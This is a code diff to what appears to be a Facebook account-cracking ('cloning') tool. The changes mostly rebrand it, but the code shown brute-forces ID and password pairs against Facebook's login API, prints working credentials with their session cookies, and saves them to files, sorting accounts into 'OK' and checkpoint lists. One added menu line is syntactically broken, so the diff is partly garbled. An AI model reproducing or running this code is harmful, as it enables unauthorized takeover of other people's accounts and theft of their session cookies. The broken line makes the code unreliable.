@@ -99,8 +99,10 @@ def menu():
     clear()
     print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
     print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
-    print(f'{G1}[{A}3{G4}]{G3} AUTO CREAT CLONING')
-    print(f'{G1}[{A}4{G4}]{G4} CONTACT TOOL OWNER')
+    print(f'{G1}[{A}3{G4}]{G3} OLD CLONING')
+    print(f'{G1}[{A}4{G4}]{G4} AUTO CREAT CLONING')
+    print(f'{G1}[{G5{G5}]{G5}print(f'{G1}[{A}4{G4}]{G4} CONTACT TOOL OWNER')
+    
     print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
     print(f'Tool Type : \033[1;33m trail\033[1;37m')
     print(f'NOTE : \033[1;31m JYA  GORKHALI :)\033[1;37m')
@@ -296,14 +298,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[PRASHANT-OK] {sid} | {ps} ")
+                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
                     print(f"\r\r{G1}[COOKIE]{A} {ckkk}")
-                    open('/sdcard/PRASHANT-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
+                    open('/sdcard/SP-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[PRASHANT-CP] {sid} | {ps} ")
-                     open('/sdcard/PRASHANT-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                     print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
+                     open('/sdcard/SP-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:
@@ -364,14 +366,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[PRASHANT-OK] {sid} | {ps} ")
+                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
                     print(f'\r\r{G1}[COOKIE]{A} {ckkk}')
-                    open('/sdcard/PRASHANT-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
+                    open('/sdcard/SP-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[PRASHANT-CP] {sid} | {ps} ")
-                    open('/sdcard/PRASHANT-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                    print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
+                    open('/sdcard/SP-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                 else:
                     continue
